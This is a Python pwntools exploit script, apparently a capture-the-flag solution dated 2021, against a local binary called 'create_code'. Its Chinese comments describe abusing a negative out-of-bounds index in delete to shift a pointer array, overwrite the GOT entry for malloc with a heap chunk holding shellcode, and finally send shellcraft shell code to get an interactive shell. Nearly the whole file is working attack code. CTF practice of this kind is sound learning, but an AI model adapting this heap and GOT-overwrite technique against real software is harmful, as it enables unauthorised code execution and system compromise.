# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './create_code'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-arm', binary,'-g','1234'])
    #p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(content):
    cmd(1)
    sa('content' , content)

def show(idx):
    cmd(2)
    sla('id' , idx)

def delete(idx):
    cmd(3)
    sla('id' , idx)

# one_gad = one_gadget(libc.path)

ptr_list = 0x6020C0

# 本题目 delete 有数组越界，可负数越界，并在 delete 时指针上移

for i in range(0x31):
    add('a' ) #48
# raw_input()
delete(0x2f)
delete(0x2e)
delete(0x2e)

add(p64(0x602088))
add("B")
add("C")

# 申请到 ptr_list 的特定位置

delete(0x100000000-0xc)
delete(0x100000000-0xc)

# 两次 delete 指针上移
# 将 ptr_list 连同 堆块数量 向上移动 0x10 

shellcode = '''
    push 0x6020C0
    pop rax
    ret
    nop
'''
# 此 shellcode 返回一个 0x6020c0 的地址

add(asm(shellcode) + p32(0x100000000-0xf))

# 前 8 字节放入 shellcode ，后 8 个字节放置 堆块数量
# 在 add 往 ptr_list 写入堆块指针时 ，会写入 ptr_list[堆块数量] 的位置
# 也就是写入 ptr_list[-0xf] 即 got 表的 malloc 处
# 此时 malloc 处指向了 一个我们已经写入shellcode 的堆块

shellcode = '''
    xor rdi , rdi
    mov rdx , rsi
    mov rsi , rbx
    xor rax , rax
    syscall
'''

add(asm(shellcode))

# 再次申请 执行 malloc 函数时直接执行 shellcode
# 再次申请 ，此时写入 ptr_list[-0xf + 1] 即 got 表的 mprotect 处

dbg()
cmd(1)

# 再次申请 执行 malloc 函数时直接执行 shellcode
# 执行 mprotect 执行第二段 shellcode 

shellcode = asm('nop')*0x20 + asm(shellcraft.sh())
se(shellcode)


p.interactive()

'''
@File    :   how2heap.py
@Time    :   2021/09/15 20:18:41
@Author  :   Niyah 
'''